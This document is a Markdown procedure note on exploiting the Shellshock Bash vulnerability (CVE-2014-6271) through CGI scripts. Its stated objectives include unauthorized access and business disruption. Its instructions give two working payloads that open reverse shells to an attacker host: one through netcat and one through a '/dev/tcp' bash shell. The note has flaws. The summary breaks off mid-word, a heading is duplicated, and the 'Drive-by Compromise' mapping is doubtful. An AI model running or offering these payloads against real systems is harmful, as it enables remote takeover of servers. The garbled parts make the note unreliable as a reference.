---
id: fad61efb-8b6c-400f-90f6-6ae4d8f3bb7f
name: CVE-2014-6271 Shellshock Remote Code Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:56.806362+00:00'
updated_at: '2023-04-06T03:55:56.817292+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Drive-by Compromise|T1189 - Drive-by Compromise]]'
tags:
- '[[Common Vulnerabilities and Exposures]]'
- '[[CVE-2014-6271 - Shellshock]]'
- '[[Older, but not forgotten]]'
commands:
- '[[Remote Code Execution via Shellshock Vulnerability]]'
---

# CVE-2014-6271 Shellshock Remote Code Execution

## Summary

CVE-2014-6271, also known as Shellshock, is a vulnerability in Bash that allows an attacker to execute arbitrary code on a targeted system. This vulnerability can be exploited remotely by an attacker who sends a specially crafted request to a vulnerable server. Successful exploitation of this vulne

## Description

# Description

CVE-2014-6271, also known as Shellshock, is a vulnerability in Bash that allows an attacker to execute arbitrary code on a targeted system. This vulnerability can be exploited remotely by an attacker who sends a specially crafted request to a vulnerable server. Successful exploitation of this vulnerability can result in the attacker gaining full access to the targeted system.

The technical explanation of this vulnerability is that Bash allowed environment variables to be passed to commands that it executed. By setting an environment variable with a specially crafted value, an attacker could execute arbitrary code on the targeted system. This vulnerability affects many Unix-based operating systems and web servers that use CGI scripts to execute Bash commands.

The business value of this vulnerability is that it can be used to gain unauthorized access to sensitive data and systems, compromise the integrity of the targeted system, and disrupt business operations.

## Requirements

1. Access to a vulnerable server.

1. Knowledge of the vulnerability and how to exploit it.

## Defense

1. Ensure that all systems and software are up-to-date with the latest security patches.

1. Implement access controls and firewalls to restrict access to vulnerable systems.

1. Monitor network traffic for signs of exploitation and take appropriate action if detected.

## Objectives

1. To exploit a vulnerable server and execute arbitrary code remotely.

1. To gain unauthorized access to sensitive data and systems.

1. To compromise the integrity of the targeted system.

1. To disrupt business operations.

# Instructions

1. Replace the IP address and port number in the command with the IP address and port number of the attacker's system. Also, replace the URL in the command with the URL of the vulnerable server.

**Code**: [[echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Age]]

> The 'echo' command sends a specially crafted request to the vulnerable server that contains a Bash command. The command uses netcat to connect back to the attacker's system on IP address 10.0.0.2 over port 4444 and opens a shell. The 'curl' command sends a similar request to the vulnerable server, but this time the command uses Bash to connect back to the attacker's system over the same IP address and port number.

**Command** ([[Remote Code Execution via Shellshock Vulnerability]]):

```bash
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\r\n"
curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi" 
```

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Drive-by Compromise|T1189 - Drive-by Compromise]]

## Commands Used

- [[Remote Code Execution via Shellshock Vulnerability]]

## Tags

- [[Common Vulnerabilities and Exposures]]
- [[CVE-2014-6271 - Shellshock]]
- [[Older, but not forgotten]]
